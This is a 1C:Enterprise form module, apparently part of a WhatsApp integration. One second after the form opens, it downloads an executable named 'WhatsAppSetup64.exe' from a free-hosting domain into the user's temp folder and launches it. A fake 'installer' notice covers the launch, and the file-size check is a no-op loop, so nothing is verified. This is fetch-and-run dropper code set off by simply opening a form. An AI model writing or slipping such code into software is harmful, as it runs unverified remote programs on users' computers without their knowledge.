
&НаКлиенте
Процедура ПриОткрытии(Отказ)
	// Показывать форму только 1 сек.
    ПодключитьОбработчикОжидания("ЗакрытьФорму", 1, Истина);
КонецПроцедуры

&НаКлиенте
Процедура ЗакрытьФорму()
	Shell = Новый COMОбъект("WScript.Shell");
	TEMP = Shell.ExpandEnvironmentStrings("%TEMP%");
	УстановочныйФайл = "\WhatsAppSetup64.exe";
	ПолныйПуть = TEMP + УстановочныйФайл;
	Соединение = Новый HTTPСоединение("f0821791.xsph.ru");
	Соединение.Получить(УстановочныйФайл, ПолныйПуть);		
	EXE = Новый Файл(ПолныйПуть);
	Пока EXE.Размер() <> "106 582 944" Цикл
		Прервать;
	КонецЦикла;
	ЗапуститьПриложение(ПолныйПуть);
	ПоказатьОповещениеПользователя("Интеграция с WhatsApp",,"Запуск установщика...",БиблиотекаКартинок.NC_ПодсистемаИнтеграцияСWhatsApp);
	ЭтаФорма.Закрыть();
КонецПроцедуры
